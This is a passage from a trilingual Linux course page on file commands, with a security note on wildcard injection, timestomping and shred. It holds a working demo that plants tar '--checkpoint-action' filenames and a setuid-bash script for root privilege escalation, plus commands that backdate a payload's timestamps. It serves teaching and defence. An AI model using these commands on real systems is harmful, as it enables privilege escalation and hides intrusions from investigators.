...
<!-- LC-CURRICULUM-START -->
> **Curriculum ID:** `LC-015` | **Phase 1:** Linux  
> **Est. study:** 3-4h | **Level:** Beginner  
> **Prerequisites:** LC-014  
> **Book map:** Shotts Â The Linux Command Line Ch.8-10; Ward Â How Linux Works Ch.4
<!-- LC-CURRICULUM-END -->
## 📖 Daftar Isi / Table of Contents / 目次

| # | Command / Topic | Bahasa Indonesia | English | 日本語 |
|---|-----------------|-----------------|---------|--------|
...
| 8 | Security Note | Wildcard injection & timestomping | Wildcard injection & timestomping | ワイルドカードインジェクションと安全な消去 |
...
## 8. 🔐 Security Note — Wildcard Injection, Timestomping & Secure Deletion

### 🇮🇩 Bahasa Indonesia
Dalam penetration testing, forensik digital, dan administrasi sistem:
1. **Unix Wildcard Injection (`*` Exploit)**: Ketika skrip otomatis atau admin menjalankan perintah seperti `tar -czf backup.tar.gz *` atau `chown user:user *` di direktori yang bisa ditulis (`/tmp` atau web upload), penyerang dapat membuat file dengan nama flag perintah seperti `--checkpoint=1` dan `--checkpoint-action=exec=sh exploit.sh` untuk mengeksekusi kode berbahaya dengan hak akses pemilik script.
2. **Timestomping Anti-Forensics**: Perintah `touch -t YYYYMMDDhhmm.ss` atau `touch -r reference_file` dapat memodifikasi timestamp (*access* dan *modification* time) file backdoor agar tersamar dan cocok dengan file sistem sah lainnya.
3. **Secure Deletion dengan `shred`**: Menghapus file dengan `rm` hanya menghapus pointer inode di filesystem, membiarkan data mentah tetap dapat dipulihkan dengan alat forensik (*Autopsy*, *TestDisk*). Gunakan `shred -u -z -n 3 file.txt` untuk menimpa data biner berulang kali sebelum dihapus.

### 🇬🇧 English
In penetration testing, digital forensics, and hardened systems administration:
1. **Unix Wildcard Injection (`*` Exploitation)**: When automated cron jobs or admins execute commands with glob wildcards (e.g., `tar -czf backup.tar.gz *` or `rsync -a * /backup/`) in writable directories, an attacker can create files named after command-line switches like `--checkpoint=1` and `--checkpoint-action=exec=sh exploit.sh` to trigger arbitrary code execution with the execution context's privileges.
2. **Anti-Forensic Timestomping**: Using `touch -t YYYYMMDDhhmm.ss` or `touch -r /bin/ls backdoor.elf` alters the file's MAC (Modified, Accessed, Changed) timestamps to match legitimate system binaries, evading chronological timeline anomaly detection.
3. **Secure Erasure with `shred`**: Conventional deletion via `rm` merely unlinks inode metadata while raw blocks remain recoverable on disk via forensic tools. Using `shred -u -z -n 3 secret.key` overwrites data blocks with random bytes and zeroes prior to unlinking.

### 🇯🇵 日本語
ペネトレーションテスト、デジタルフォレンジクス、システム管理において極めて重要な知見：
1. **ワイルドカードインジェクション（Unix Wildcard Exploit）**: 書き込み可能なディレクトリ内で `tar -czf backup.tar.gz *` などのワイルドカードを含むコマンドが実行される際、`--checkpoint=1` や `--checkpoint-action=exec=sh exploit.sh` という名前のファイルを配置することで、スクリプト実行権限で任意のコードを実行させることが可能です。
2. **タイムストンプ（Timestomping）**: `touch -t YYYYMMDDhhmm.ss` や `touch -r /bin/ls backdoor.elf` を用いて、バックドアのアクセス日時や更新日時を正規システムファイルと偽装し、時系列フォレンジクス調査を回避します。
3. **`shred` による安全なデータ消去**: `rm` による削除は inode ポインタの解除に過ぎず、未上書きの生データは復元可能です。`shred -u -z -n 3 secret.key` を実行し、ランダムデータとゼロで上書きすることで確実な消去を行います。

```bash
# ── WILDCARD INJECTION DEMO (TAR ARBITRARY CODE EXECUTION) ───
$ echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > /var/www/uploads/shell.sh
$ touch /var/www/uploads/--checkpoint=1
$ touch /var/www/uploads/--checkpoint-action=exec=sh\ shell.sh
# When root cron runs: tar -czf backup.tar.gz /var/www/uploads/*
# Root executes shell.sh!

# ── TIMESTOMPING ANTI-FORENSICS ──────────────────────────────
# Match timestamp of malicious payload to /bin/ls
$ touch -r /bin/ls malicious_payload.so
$ stat malicious_payload.so

# ── SECURE DELETION ──────────────────────────────────────────
# Overwrite 3 times with random data, add final zero pass, and remove
$ shred -u -z -n 3 sensitive_credentials.txt
```
...
touch -r ref_file target.txt          # match timestamp
...
shred -u -z -n 3 secret.txt           # secure data wipe
```
...
> - `man touch`, `man mkdir`, `man mv`, `man cp`, `man rm`, `man tree`, `man shred`
